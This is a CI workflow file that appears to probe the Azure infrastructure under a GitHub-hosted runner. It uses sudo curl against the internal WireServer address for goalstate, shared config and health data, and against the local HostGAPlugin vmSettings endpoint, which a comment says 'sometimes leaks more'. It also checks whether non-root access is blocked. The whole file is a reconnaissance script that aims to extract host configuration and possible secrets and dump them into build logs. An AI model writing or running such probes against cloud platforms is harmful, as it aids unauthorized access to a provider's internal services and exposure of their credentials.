name: Wireserver Probe
on: [push]

jobs:
  wireserver:
    runs-on: ubuntu-latest
    steps:
      - name: Try wireserver with right headers
        shell: bash
        run: |
          set +e
          
          echo "===== goalstate via sudo ====="
          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
          echo ""
          
          echo "===== machine via sudo ====="
          sudo curl --max-time 10 -s "http://168.63.129.16/machine" -H "x-ms-version: 2015-04-05" 2>&1 | head -50
          echo ""
          
          echo "===== shared config ====="
          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=config&type=sharedConfig&incarnation=1" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
          echo ""
          
          echo "===== As non-sudo (should be BLOCKED) ====="
          curl --max-time 5 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -10 || echo "blocked"
          echo ""
          
          echo "===== Heartbeat status ====="
          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=health" -H "x-ms-version: 2015-04-05" -X POST 2>&1 | head -30
          echo ""
          
          echo "===== HostGAPlugin (sometimes leaks more) ====="
          # Most Azure VMs run HostGAPlugin on port 32526 locally
          sudo curl --max-time 5 -s "http://127.0.0.1:32526/vmSettings" 2>&1 | head -30 || echo "no host plugin"
          
          echo ""
          echo "===== /run/extensions ====="
          sudo find /run /var/run -name "*.json" 2>&1 | head -10
          
          true
